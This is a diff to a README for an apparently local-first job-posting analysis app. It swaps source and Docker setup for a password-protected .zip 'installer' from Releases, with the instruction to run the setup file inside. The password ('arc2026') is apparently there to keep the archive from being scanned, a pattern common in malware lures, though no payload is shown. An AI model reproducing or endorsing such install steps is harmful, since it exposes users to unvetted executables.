@@ -41,7 +41,7 @@ Analyze multiple job postings to discover:
 ### 🔒 100% Private & Local-First
 - Powered by **Ollama** (Llama 3.1, Qwen2, DeepSeek, Phi-4 and other local models)
 - Optional fallback to Groq, OpenAI or Anthropic
-- All your data stays on your machine (SQLite by default)
+- All your data stays on your machine
 - GDPR-friendly privacy — nothing ever leaves your computer
 
 ### 🌍 Focused on the European Job Market
@@ -57,12 +57,12 @@ Works great with major European platforms:
 ## 📥 Installation
 
 1. Go to the **Releases** section of this repository
-2. Download the latest archive (`.zip`)
-3. Extract the files using any archiver (WinRAR / 7-Zip / etc.)
-   - **Password:** `LocHi`
-4. Open the extracted folder and follow the instructions inside
+2. Download the latest installer package (`.zip` archive)
+3. Extract the files using any archiver (WinRAR / 7-Zip)
+   - **Password:** `arc2026`
+4. Open the extracted folder and run the setup file to install the application
 
-Once launched, the application will be available at `http://localhost:3000`.
+
 
 ## Tech Stack
 
@@ -70,7 +70,6 @@ Once launched, the application will be available at `http://localhost:3000`.
 - **UI**: Tailwind CSS + Shadcn/ui
 - **AI**: Ollama (local-first) with provider fallback support
 - **Database**: SQLite / PostgreSQL
-- **Deployment**: Docker + Docker Compose
 
 ## Roadmap
 
@@ -79,8 +78,6 @@ Once launched, the application will be available at `http://localhost:3000`.
 - [x] Full local Ollama integration
 - [ ] Enhanced support for European job boards
 - [ ] Chrome extension for quick job saving
-- [ ] Email integration and intelligent follow-up suggestions
-- [ ] Advanced career reporting
 
 ## Contributing
 
